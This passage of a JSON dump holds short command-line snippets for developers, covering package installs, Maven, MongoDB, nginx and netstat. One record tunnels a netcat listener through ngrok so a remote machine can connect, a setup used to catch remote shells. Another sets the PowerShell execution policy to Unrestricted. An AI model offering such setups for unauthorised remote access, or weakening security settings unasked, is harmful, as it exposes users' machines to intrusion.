    "reg_date": "2021-10-11T22:10:04.000Z"
  },
  {
    "id": 3555,
    "keyword": null,
    "link": null,
    "title": " mariadb galera cluster exists on initial sync",
    "description": "## Edit this file nano /etc/systemd/system/mysqld.service  ## Add the below at the bottom of the file # For large initial DB syncs enable this setting TimeoutStartSec=9999999999999999  ## After saving run this then restart mariadb systemctl daemon-reload\n",
    "reg_date": "2021-10-11T22:10:04.000Z"
  },
  {
    "id": 3556,
    "keyword": null,
    "link": null,
    "title": " markdown todo complete",
    "description": "### Solar System Exploration, 1950s &ndash; 1960s  - [ ] Mercury - [x] Venus - [x] Earth (Orbit/Moon) - [x] Mars - [ ] Jupiter - [ ] Saturn - [ ] Uranus - [ ] Neptune - [ ] Comet Haley\n",
    "reg_date": "2021-10-11T22:10:04.000Z"
  },
  {
    "id": 3557,
    "keyword": null,
    "link": null,
    "title": " mate-polkit-bin for ubuntu",
    "description": "sudo apt-get update sudo apt-get install mate-polkit-bin\n",
    "reg_date": "2021-10-11T22:10:04.000Z"
  },
  {
    "id": 3558,
    "keyword": null,
    "link": null,
    "title": " material ui install",
    "description": "// usando npm npm install @material-ui/core  // usando yarn yarn add @material-ui/core\nnpm install @material-ui/core  # Yarn yarn add @material-ui/core\n// with npm npm install @material-ui/core  // with yarn yarn add @material-ui/core\n// npm npm install @material-ui/core  // yarn yarn add @material-ui/core\nMaterial UI Installation\n<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap\" />\n",
    "reg_date": "2021-10-11T22:10:04.000Z"
  },
  {
    "id": 3559,
    "keyword": null,
    "link": null,
    "title": " matplotlib install",
    "description": "pip install matplotlib\nsudo apt install python3-matplotlib\npip3 install matplotlib\n// install matplotlib  pip install matplotlib  // using conda  conda install -c conda-forge matplotlib \nfirst add pypy and its scripts folder to path! then use the following code in terminal:  pypy3 -m pip install matplotlib  do not worry if it looked stuck at the end.\n",
    "reg_date": "2021-10-11T22:10:04.000Z"
  },
  {
    "id": 3560,
    "keyword": null,
    "link": null,
    "title": " maven install on mac os x",
    "description": "brew install maven\n",
    "reg_date": "2021-10-11T22:10:05.000Z"
  },
  {
    "id": 3561,
    "keyword": null,
    "link": null,
    "title": " maven skip test",
    "description": "mvn clean install -Dmaven.test.skip=true\nmvn install -Dmaven.test.skip=true  # or  mvn install -DskipTests  # If -Dmaven.test.skip=true (or simply -Dmaven.test.skip) is specified,  # the test-jars aren't built, and any module that relies on them will  # fail its build.  # In contrast, when you use -DskipTests, Maven does not run the tests,  # but it does compile them and build the test-jar, making it available  # for the subsequent modules.\nmvn package -Dmaven.test.skip=true \nmvn install -Dmaven.test.skip=true\nmvn install -Dmaven.test.skip=true mvn install -DskipTests\nSkipping tests in Maven\n",
    "reg_date": "2021-10-11T22:10:05.000Z"
  },
  {
    "id": 3562,
    "keyword": null,
    "link": null,
    "title": " maven skip tests",
    "description": "mvn clean install -Dmaven.test.skip=true\nmvn install -Dmaven.test.skip=true  # or  mvn install -DskipTests  # If -Dmaven.test.skip=true (or simply -Dmaven.test.skip) is specified,  # the test-jars aren't built, and any module that relies on them will  # fail its build.  # In contrast, when you use -DskipTests, Maven does not run the tests,  # but it does compile them and build the test-jar, making it available  # for the subsequent modules.\nmvn clean install -DskipTests \nmvn package -Dmaven.test.skip=true \nmvn install -Dmaven.test.skip=true\nmvn install -Dmaven.test.skip=true mvn install -DskipTests\n",
    "reg_date": "2021-10-11T22:10:05.000Z"
  },
  {
    "id": 3563,
    "keyword": null,
    "link": null,
    "title": " maven test class",
    "description": "mvn install -Dmaven.test.skip=true  # or  mvn install -DskipTests  # If -Dmaven.test.skip=true (or simply -Dmaven.test.skip) is specified,  # the test-jars aren't built, and any module that relies on them will  # fail its build.  # In contrast, when you use -DskipTests, Maven does not run the tests,  # but it does compile them and build the test-jar, making it available  # for the subsequent modules.\nprivate final ByteArrayOutputStream outContent = new ByteArrayOutputStream(); private final ByteArrayOutputStream errContent = new ByteArrayOutputStream(); private final PrintStream originalOut = System.out; private final PrintStream originalErr = System.err;  @Before public void setUpStreams() {     System.setOut(new PrintStream(outContent));     System.setErr(new PrintStream(errContent)); }  @After public void restoreStreams() {     System.setOut(originalOut);     System.setErr(originalErr); }  sample test cases:  @Test public void out() {     System.out.print(\"hello\");     assertEquals(\"hello\", outContent.toString()); }  @Test public void err() {     System.err.print(\"hello again\");     assertEquals(\"hello again\", errContent.toString()); }\n# Run all the unit test classes. $ mvn test  # Run a single test class. $ mvn -Dtest=TestApp1 test  # Run multiple test classes. $ mvn -Dtest=TestApp1,TestApp2 test  # Run a single test method from a test class. $ mvn -Dtest=TestApp1#methodname test  # Run all test methods that match pattern 'testHello*' from a test class. $ mvn -Dtest=TestApp1#testHello* test  # Run all test methods match pattern 'testHello*' and 'testMagic*' from a test class. $ mvn -Dtest=TestApp1#testHello*+testMagic* test\n",
    "reg_date": "2021-10-11T22:10:05.000Z"
  },
  {
    "id": 3564,
    "keyword": null,
    "link": null,
    "title": " mdi 5.6.55",
    "description": "npm install @mdi/font\n",
    "reg_date": "2021-10-11T22:10:05.000Z"
  },
  {
    "id": 3565,
    "keyword": null,
    "link": null,
    "title": " metasploit install kali linux",
    "description": "sudo apt install metasploit-framework\n",
    "reg_date": "2021-10-11T22:10:05.000Z"
  },
  {
    "id": 3566,
    "keyword": null,
    "link": null,
    "title": " microPY lib",
    "description": "#MicroCSS by INovomiast (ME!) avaliable on github repo! pip install microPY\n",
    "reg_date": "2021-10-11T22:10:06.000Z"
  },
  {
    "id": 3567,
    "keyword": null,
    "link": null,
    "title": " microsoft teams reopen main window",
    "description": "On Mac: double click on Teams icon in the dock (Mac pop-up app bar). If this does not work, restart Teams.\n",
    "reg_date": "2021-10-11T22:10:06.000Z"
  },
  {
    "id": 3568,
    "keyword": null,
    "link": null,
    "title": " microstack change dashboard port",
    "description": "# 8787 is whatever port you want. sudo snap set microstack config.network.ports.dashboard=8787 sudo reboot\n",
    "reg_date": "2021-10-11T22:10:06.000Z"
  },
  {
    "id": 3569,
    "keyword": null,
    "link": null,
    "title": " microstack change horizon port",
    "description": "# 8787 is whatever port you want. sudo snap set microstack config.network.ports.dashboard=8787 sudo reboot\n",
    "reg_date": "2021-10-11T22:10:06.000Z"
  },
  {
    "id": 3570,
    "keyword": null,
    "link": null,
    "title": " microstack no internet connection",
    "description": "# This answer is based on the default microstack example from site below: # https://ubuntu.com/openstack/install  # Type the below commands in the machine that hosts microstack sudo iptables -t nat -A POSTROUTING -s 10.20.20.1/24 ! -d 10.20.20.1/24 -j MASQUERADE sudo sysctl net.ipv4.ip_forward=1\n",
    "reg_date": "2021-10-11T22:10:07.000Z"
  },
  {
    "id": 3571,
    "keyword": null,
    "link": null,
    "title": " migrate fresh",
    "description": "php artisan migrate:refresh  #https://www.fiverr.com/tamerjarrar\nphp artisan migrate:refresh --step=1\n",
    "reg_date": "2021-10-11T22:10:07.000Z"
  },
  {
    "id": 3572,
    "keyword": null,
    "link": null,
    "title": " migrate specific migration file laravel",
    "description": "php artisan migrate --path=/database/migrations/fileName.php\nphp artisan migrate  --path=/database/migrations/selected\nphp artisan migrate:refresh --path=/database/migrations/2021_06_23_093317_create_users_table.php\n* To run a specific migration  php artisan migrate:refresh --path=/database/migrations/2019_03_23_165757_create_combined_1553343771_users_table.php    - Note: it will drop the table and create a new one.  \n",
    "reg_date": "2021-10-11T22:10:07.000Z"
  },
  {
    "id": 3573,
    "keyword": null,
    "link": null,
    "title": " migration rollback",
    "description": "php artisan migrate:rollback --step=1\nphp artisan migrate:rollback\nrake db:rollback\nTo rollback one step:  php artisan migrate:rollback  To rollback multiple steps:  php artisan migrate:rollback --step=[x]    To drop all tables and reload all migrations:  php artisan migrate:fresh\n",
    "reg_date": "2021-10-11T22:10:07.000Z"
  },
  {
    "id": 3574,
    "keyword": null,
    "link": null,
    "title": " mkdir create if not exists",
    "description": "mkdir -p foo/bar/baz\n",
    "reg_date": "2021-10-11T22:10:07.000Z"
  },
  {
    "id": 3575,
    "keyword": null,
    "link": null,
    "title": " mklink powershell",
    "description": "# In elevated powershell New-Item -ItemType SymbolicLink -Path \"Link\" -Target \"Target\"\nnew-item -itemtype symboliclink -path <path to location> -name <the name> -value <path to target>\n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3576,
    "keyword": null,
    "link": null,
    "title": " mkv to mp4 linux",
    "description": "ffmpeg -i input.mkv -codec copy output.mp4\n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3577,
    "keyword": null,
    "link": null,
    "title": " mocha zsh: command not found: mocha",
    "description": "npm install -g mocha\n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3578,
    "keyword": null,
    "link": null,
    "title": " modify registry value",
    "description": "#1 like a noob win + r ; \"REGEDIT\" #2 like a pro REG ADD HKCU\\psw\\pp /v DeviceState /t REG_DWORD /d 1000001 /v : name of value  |  'deviceState' /t : type \t\t\t|  'REG_DWORD', 'REG_BINARY', 'REG_LINK' ... /d : data\t\t\t|  1 , 1000001 ... HKCU : Current User   #BTW 'reg add' do modify too \n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3579,
    "keyword": null,
    "link": null,
    "title": " moment js ionic",
    "description": "npm install moment --save # And import in your .ts file, there is no need to import in your module. import * as moment from 'moment';\n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3580,
    "keyword": null,
    "link": null,
    "title": " mongodb compass community linux",
    "description": "--donwload wget https://downloads.mongodb.com/compass/mongodb-compass_1.24.1_amd64.deb --install sudo dpkg -i mongodb-compass_1.24.1_amd64.deb --run mongodb-compass\n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3581,
    "keyword": null,
    "link": null,
    "title": " mongodb did not start",
    "description": "sudo rm /var/lib/mongodb/mongod.lock mongod --repair sudo service mongodb start  This should solve the problem    \n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3582,
    "keyword": null,
    "link": null,
    "title": " mongodb get all users",
    "description": "use admin db.system.users.find()\ndb.getUsers();\ndb.getUsers()\n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3583,
    "keyword": null,
    "link": null,
    "title": " mongodb install in ubuntu",
    "description": "sudo apt update sudo apt install -y mongodb //checking service and db sudo systemctl status mongodb or service mongodb status //start service sudo systemctl start mongod or service mongodb start //stop service sudo systemctl stop mongod  or service mongodb stop \nsudo systemctl start mongod sudo systemctl stop mongod\nwget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add - echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/4.4 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list sudo apt-get update sudo apt-get install -y mongodb-org \n How To Install MongoDB on Ubuntu 18.04 through command line :  Step 1 &mdash; Installing MongoDB  $ curl -fsSL https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -  $ apt-key list  $ sudo apt update  $ sudo apt install mongodb-org    Step 2 &mdash; Starting the MongoDB Service and Testing the Database  Run the following systemctl command to start the MongoDB service:  $ sudo systemctl start mongod.service  $ sudo systemctl status mongod             $ sudo systemctl enable mongod  $ mongo --eval 'db.runCommand({ connectionStatus: 1 })' \nfollow the steps from the below link  https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/\necho \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/4.4 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list \n",
    "reg_date": "2021-10-11T22:10:08.000Z"
  },
  {
    "id": 3584,
    "keyword": null,
    "link": null,
    "title": " mongodb list users",
    "description": "use admin db.system.users.find()\ndb.getUsers();\ndb.getUsers()\ndb.getUsers() \n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3585,
    "keyword": null,
    "link": null,
    "title": " mongodb log directory missing ubuntu",
    "description": "Check the MongoDB config file at /etc/mongod.conf or /yourMongoDBpath/mongod.conf, the logpath defined where to log.  sudo chown mongodb /var/log/mongodb \n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3586,
    "keyword": null,
    "link": null,
    "title": " mongodb recherche like",
    "description": "db.users.find({\"name\": /m/}) or db.users.find({\"name\": /.*m.*/})  You're looking for something that contains \"m\" somewhere (SQL's '%' operator is equivalent to Regexp's '.*'),  not something that has \"m\" anchored to the beginning of the string.\n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3587,
    "keyword": null,
    "link": null,
    "title": " mongodb restart command ubuntu",
    "description": "sudo apt update sudo apt install -y mongodb //checking service and db sudo systemctl status mongodb or service mongodb status //start service sudo systemctl start mongod or service mongodb start //stop service sudo systemctl stop mongod  or service mongodb stop \nsudo systemctl restart mongodb # it will restarts running mongodb server\nsudo systemctl restart mongod\n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3588,
    "keyword": null,
    "link": null,
    "title": " mongodb shell query last document",
    "description": "db.collection.find().limit(1).sort({$natural:-1})\n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3589,
    "keyword": null,
    "link": null,
    "title": " mongodb show database command linux",
    "description": "show databases show dbs\nshow collections show tables db.getCollectionNames()\n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3590,
    "keyword": null,
    "link": null,
    "title": " mongodb stop server mac",
    "description": "//stops mongodb server brew services stop mongodb-community@4.4   //starts mongodb server brew services start mongodb-community@4.4 \n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3591,
    "keyword": null,
    "link": null,
    "title": " monolithic kernel vs microkernel",
    "description": "Monolithic kernel is a single large process running entirely  in a single address space. It is a single static binary file.  All kernel services exist and execute in the kernel address space.  The kernel can invoke functions directly.  Examples of monolithic kernel based OSs: Unix, Linux.  In microkernels, the kernel is broken down into separate processes,  known as servers. Some of the servers run in kernel space and  some run in user-space. All servers are kept separate and  run in different address spaces.  Servers invoke \"services\" from each other by sending messages via  IPC (Interprocess Communication).  This separation has the advantage that if one server fails,  other servers can still work efficiently.  Examples of microkernel based OSs: Mac OS X and Windows NT.\n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3592,
    "keyword": null,
    "link": null,
    "title": " mount d on wsl",
    "description": "Mount $ sudo mkdir /mnt/d $ sudo mount -t drvfs D: /mnt/d Unmount $ sudo unmount /mnt/d\n",
    "reg_date": "2021-10-11T22:10:09.000Z"
  },
  {
    "id": 3593,
    "keyword": null,
    "link": null,
    "title": " move a folder in ubuntu terminal",
    "description": "sudo mv /fromPath/ /toPath/ sudo mv /root/folder1 /home/folder2/\n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3594,
    "keyword": null,
    "link": null,
    "title": " move files with in bash",
    "description": "mv path/to/src  to/path/destination\n# Linux - Bash  # syntax: mv [options] <source-filepath> <destination-filepath>  # example-1 (fundamental - no switches): mv \"C:\\Users\\File_Name.txt\" \"C:\\Users\\SubFolder\\File_Name.txt\"  # example-2 (fundamental - with switches): mv -u \"C:\\Users\\File_Name.txt\" \"C:\\Users\\SubFolder\\File_Name.txt\"  # + ------ + ---------------------------------------------------------- + # | OPTION |  DESCRIPTION                                               | # + ------ + ---------------------------------------------------------- + # |   -f   | force move by overwriting destination file without prompt  | # |   -i   | interactive prompt before overwrite                        | # |   -u   | update - move when source is newer than destination        | # |   -v   | verbose - print source and destination files               | # | man mv | help manual                                                | # + ------ + ---------------------------------------------------------- + \n# Linux - Bash  # syntax: mv [options] <source-filepath> <destination-filepath>  # example-1 (fundamental - no switches): mv \"C:\\Users\\File_Name.txt\" \"C:\\Users\\SubFolder\\File_Name.txt\"  # example-2 (fundamental - with switches): mv -u \"C:\\Users\\File_Name.txt\" \"C:\\Users\\SubFolder\\File_Name.txt\"  # Switches OPTION\tDESCRIPTION mv -f\tforce move by overwriting destination file without prompt mv -i\tinteractive prompt before overwrite mv -u\tupdate - move when source is newer than destination mv -v\tverbose - print source and destination files\nmv file dir\n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3595,
    "keyword": null,
    "link": null,
    "title": " move huge number of files from local to hdfs",
    "description": "move huge number of files from local to hdfs \n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3596,
    "keyword": null,
    "link": null,
    "title": " move word backwards",
    "description": "Ctrl + Left Arrow or Alt+B or Esc and then B &ndash; moves the cursor back one word at a time.\n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3597,
    "keyword": null,
    "link": null,
    "title": " move word backwards console unix",
    "description": "Ctrl + Left Arrow or Alt+B or Esc and then B &ndash; moves the cursor back one word at a time.\n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3598,
    "keyword": null,
    "link": null,
    "title": " mui treasury styles install",
    "description": "npm install @mui-treasury/styles \n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3599,
    "keyword": null,
    "link": null,
    "title": " mv batch rename extension",
    "description": "for f in *.oldext; do      mv -- \"$f\" \"${f%.oldext}.newext\" done \n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3600,
    "keyword": null,
    "link": null,
    "title": " mvn clean install skip test",
    "description": "mvn clean install -Dmaven.test.skip=true\nmvn package -Dmaven.test.skip=true \nmvn install -Dcheckstyle.skip\n",
    "reg_date": "2021-10-11T22:10:10.000Z"
  },
  {
    "id": 3601,
    "keyword": null,
    "link": null,
    "title": " mysql This usually indicates unclean termination of a previous run, or service implementation deficiencies.",
    "description": "sudo reboot\n",
    "reg_date": "2021-10-11T22:10:11.000Z"
  },
  {
    "id": 3602,
    "keyword": null,
    "link": null,
    "title": " mysqlclient install ubuntu",
    "description": "sudo apt-get install python3-dev default-libmysqlclient-dev build-essential pip install mysqlclient \n",
    "reg_date": "2021-10-11T22:10:11.000Z"
  },
  {
    "id": 3603,
    "keyword": null,
    "link": null,
    "title": " mysqld restart",
    "description": "sudo /etc/init.d/mysql restart\n                                     service mysqld restart \n sudo /usr/local/mysql/support-files/mysql.server restart\n",
    "reg_date": "2021-10-11T22:10:11.000Z"
  },
  {
    "id": 3604,
    "keyword": null,
    "link": null,
    "title": " name of exe on ubuntu 20.04 terminal",
    "description": "#open ubuntu terminal by command line $ /usr/bin/gnome-terminal\n",
    "reg_date": "2021-10-11T22:10:12.000Z"
  },
  {
    "id": 3605,
    "keyword": null,
    "link": null,
    "title": " nano with line numbers",
    "description": "nano --linenumbers [filename]\nPress  Alt+#  or Alt+Shift+3\naccording to the man page for nanorc, you can add set linenumbers in ~/.nanorc, /etc/nanorc, $XDG_CONFIG_HOME/nano/nanorc or ~/.config/nano/nanorc.\nTo show line numbers along the side: ALT + SHIFT + 3 To show cursor position at the bottom: ALT + C (or CTRL + C for temporary)\n       -l, --linenumbers               Display line numbers to the left of the text area. \n",
    "reg_date": "2021-10-11T22:10:12.000Z"
  },
  {
    "id": 3606,
    "keyword": null,
    "link": null,
    "title": " nbash creacte new folder",
    "description": "$ cd documents $ mkdir assignments $ cd assignments $ pwd     /users/jpalomino/documents/assignments \n",
    "reg_date": "2021-10-11T22:10:12.000Z"
  },
  {
    "id": 3607,
    "keyword": null,
    "link": null,
    "title": " neovim source current file",
    "description": "# Basic syntax: # From inside vim run: :so %  # If using lua, a convenient remap is: vim.api.nvim_set_keymap('n', '<Leader>so', ':w<CR>:so %<CR>', { noremap = true, silent = true } )\n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3608,
    "keyword": null,
    "link": null,
    "title": " netplan file ubuntu",
    "description": "# sudo su # cp /etc/netplan/01-netcfg.yaml /etc/netplan/01-netcfg.yaml.bak  # nano /etc/netplan/01-netcfg.yaml  #configuration example network:     ethernets:         ens33:             dhcp4: true             optional: true         ens34:             dhcp4: false             addresses: [192.168.231.3/24]             gateway4: 192.168.231.50             nameservers:                addresses: [192.168.231.50, 8.8.8.8]         ens35:             dhcp4: true     version: 2  # netplan try # netplan apply\n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3609,
    "keyword": null,
    "link": null,
    "title": " netstat -ano | findstr kill",
    "description": "Kill Process in Windows  Step 1:  Open up cmd.exe (note: you may need to run it as an administrator, but this isn't always necessary), then run the below command:  netstat -ano | findstr :PORT_NUMBER  (Replace PORT_NUMBER with the port number you want, but keep the colon)    The area circled in red shows the PID (process identifier). Locate the PID of the process that's using the port you want.  Step 2:  Next, run the following command:  taskkill /PID PORT_NUMBER /F    \n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3610,
    "keyword": null,
    "link": null,
    "title": " netstat -tulpn | grep :80",
    "description": "netstat -tulpn | grep :80\n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3611,
    "keyword": null,
    "link": null,
    "title": " netstat centos ports",
    "description": "# netstat -tulnp\nsudo ss -lntu  sudo netstat -ltup sudo netstat -tulnp\n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3612,
    "keyword": null,
    "link": null,
    "title": " netstat check port",
    "description": "netstat -na | find \"8080\" \n$ sudo ss -lptn 'sport = :80' State   Local Address:Port  Peer Address:Port               LISTEN  127.0.0.1:80        *:*                users:((\"nginx\",pid=125004,fd=12)) LISTEN  ::1:80              :::*               users:((\"nginx\",pid=125004,fd=11)) \nsudo netstat -plnt \n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3613,
    "keyword": null,
    "link": null,
    "title": " netstat command in linux to check specific port",
    "description": "netstat -tulpn | grep :80\nnetstat -tulpn\n## if you use linux sudo ss -tulw \n",
    "reg_date": "2021-10-11T22:10:13.000Z"
  },
  {
    "id": 3614,
    "keyword": null,
    "link": null,
    "title": " netstat install",
    "description": "# apt install net-tools     [On Debian/Ubuntu]\n# yum install net-tools     [On CentOS/RHEL] # apt install net-tools     [On Debian/Ubuntu] # zypper install net-tools  [On OpenSuse] # pacman -S netstat-nat     [On Arch Linux] \n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3615,
    "keyword": null,
    "link": null,
    "title": " netstat listening port 8080 mac",
    "description": "lsof -nP -iTCP:$PORT | grep LISTEN \n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3616,
    "keyword": null,
    "link": null,
    "title": " network manager restart ubuntu",
    "description": "sudo service network-manager restart \n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3617,
    "keyword": null,
    "link": null,
    "title": " new-team powershell",
    "description": "New-Team    -DisplayName <String>    [-Description <String>]    [-MailNickName <String>]    [-Classification <String>]    [-Visibility <String>]    [-Template <String>]    [-Owner <String>]    [-AllowGiphy <Boolean>]    [-GiphyContentRating <String>]    [-AllowStickersAndMemes <Boolean>]    [-AllowCustomMemes <Boolean>]    [-AllowGuestCreateUpdateChannels <Boolean>]    [-AllowGuestDeleteChannels <Boolean>]    [-AllowCreateUpdateChannels <Boolean>]    [-AllowDeleteChannels <Boolean>]    [-AllowAddRemoveApps <Boolean>]    [-AllowCreateUpdateRemoveTabs <Boolean>]    [-AllowCreateUpdateRemoveConnectors <Boolean>]    [-AllowUserEditMessages <Boolean>]    [-AllowUserDeleteMessages <Boolean>]    [-AllowOwnerDeleteMessages <Boolean>]    [-AllowTeamMentions <Boolean>]    [-AllowChannelMentions <Boolean>]    [-ShowInTeamsSearchAndSuggestions <Boolean>]     [-RetainCreatedGroup <SwitchParameter>]    [<CommonParameters>]\n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3618,
    "keyword": null,
    "link": null,
    "title": " ng2-validation",
    "description": "npm install ng2-validation --save\n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3619,
    "keyword": null,
    "link": null,
    "title": " ng : File C:\\Program Files\\nodejs\\ng.ps1 cannot be loaded because running scripts is disabled on this system.",
    "description": "Set-ExecutionPolicy -Scope \"CurrentUser\" -ExecutionPolicy \"RemoteSigned\"\nRun this command on your VScode integrated terminal:  Set-ExecutionPolicy -ExecutionPolicy Unrestricted\ndeleting ng.ps1 everything was going in perfect way\n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3620,
    "keyword": null,
    "link": null,
    "title": " ng add @angular/material",
    "description": "ng add @angular/material\nnpm i @angular/material\nnpm install --save @angular/material @angular/cdk @angular/animations \n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3621,
    "keyword": null,
    "link": null,
    "title": " ng g c --skipTests true",
    "description": "ng generate component --skipTests=true component-name \n",
    "reg_date": "2021-10-11T22:10:14.000Z"
  },
  {
    "id": 3622,
    "keyword": null,
    "link": null,
    "title": " nginx: [alert] could not open error log file: open() \"/var/log/nginx/error.log\" failed (13: Permission denied)",
    "description": "sudo chown -R www-data:www-data /var/log/nginx; sudo chmod -R 755 /var/log/nginx;\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3623,
    "keyword": null,
    "link": null,
    "title": " nginx: [error] open() \"/run/nginx.pid\" failed (2: No such file or directory)",
    "description": "sudo service nginx restart sudo nginx -s reload -t sudo nginx -s reload\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3624,
    "keyword": null,
    "link": null,
    "title": " nginx -t",
    "description": "nginx -t\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3625,
    "keyword": null,
    "link": null,
    "title": " nginx E: Sub-process /usr/bin/dpkg returned an error code (1)",
    "description": "#remove nginx $ sudo apt-get remove nginx* --purge after that I installed nginx-common  # install following $ sudo apt-get install nginx-common $ sudo apt-get install nginx  #Then it will work well\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3626,
    "keyword": null,
    "link": null,
    "title": " nginx by brew",
    "description": "brew install nginx\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3627,
    "keyword": null,
    "link": null,
    "title": " nginx certbot ubuntu",
    "description": "sudo add-apt-repository ppa:certbot/certbot sudo apt install python-certbot-nginx sudo certbot --nginx -d example.com -d www.example.com\n// Ubuntu 20.04 sudo apt install certbot python3-certbot-nginx  // Ubuntu 18.04 sudo add-apt-repository ppa:certbot/certbot sudo apt install python-certbot-nginx  // Configure ufw sudo ufw allow 'Nginx Full' sudo ufw delete allow 'Nginx HTTP' sudo ufw delete allow 'Nginx HTTPS'  sudo certbot --nginx -d example.com\n#Once you have installed CertBot and Lets Encyrypt,  #and you have set up your server blocks,  #you will be able to run the below script in your terminal sudo certbot --nginx -d example.com -d www.example.com\nsudo certbot renew sudo service nginx restart\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3628,
    "keyword": null,
    "link": null,
    "title": " nginx on mac",
    "description": "brew install nginx brew services start nginx\nbrew services start nginx\n",
    "reg_date": "2021-10-11T22:10:15.000Z"
  },
  {
    "id": 3629,
    "keyword": null,
    "link": null,
    "title": " nginx post size",
    "description": "client_max_body_size 100M;\n",
    "reg_date": "2021-10-11T22:10:16.000Z"
  },
  {
    "id": 3630,
    "keyword": null,
    "link": null,
    "title": " nginx restart ubuntu",
    "description": "sudo systemctl restart nginx\nsudo service nginx restart\nsystemctl restart nginx\n",
    "reg_date": "2021-10-11T22:10:16.000Z"
  },
  {
    "id": 3631,
    "keyword": null,
    "link": null,
    "title": " nginx stop commands",
    "description": "sudo systemctl stop nginx\n",
    "reg_date": "2021-10-11T22:10:16.000Z"
  },
  {
    "id": 3632,
    "keyword": null,
    "link": null,
    "title": " nginx stop if proxy pass is down",
    "description": "server {     listen 9000;     server_name example1.example.com;     location / {         set $target something.service.lab.mu;         proxy_pass http://$target;     } }\n",
    "reg_date": "2021-10-11T22:10:16.000Z"
  },
  {
    "id": 3633,
    "keyword": null,
    "link": null,
    "title": " nginx test",
    "description": "$ sudo nginx -t nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful\nnginx -t\n$ [sudo] nginx -t\n",
    "reg_date": "2021-10-11T22:10:16.000Z"
  },
  {
    "id": 3634,
    "keyword": null,
    "link": null,
    "title": " ngrok run in background and get link",
    "description": "ngrok http 80 --log=stdout > ngrok.log &\n",
    "reg_date": "2021-10-11T22:10:17.000Z"
  },
  {
    "id": 3635,
    "keyword": null,
    "link": null,
    "title": " ngrok with netcat",
    "description": "nc -lvnp 87 ^^^ Run this command on shell session#1  ngrok tcp 87 ^^^ Run this command on shell session#2 ^^^ Both sessions should be simultaneously running ^^^ In the shown screen look for domain name and port in \"Forwarding\" nslookup <ip address without protocol and port> ^^^ Get its ip through nslookup command  nc <ip> <port> ^^^ On remote computer, execute this command.\n",
    "reg_date": "2021-10-11T22:10:17.000Z"
  },
  {
    "id": 3636,
    "keyword": null,
    "link": null,
    "title": " ngx translate install",
    "description": "npm i @ngx-translate/core --save\nnpm install @ngx-translate/core --save \nnpm install @ngx-translate/core --save\n",
    "reg_date": "2021-10-11T22:10:17.000Z"
  },
  {
    "id": 3637,
    "keyword": null,
    "link": null,
    "title": " ngxcountup",
    "description": "npm i ngx-countup --save\n",
    "reg_date": "2021-10-11T22:10:18.000Z"
  },
  {
    "id": 3638,
    "keyword": null,
    "link": null,
    "title": " nmcli connect wifi",
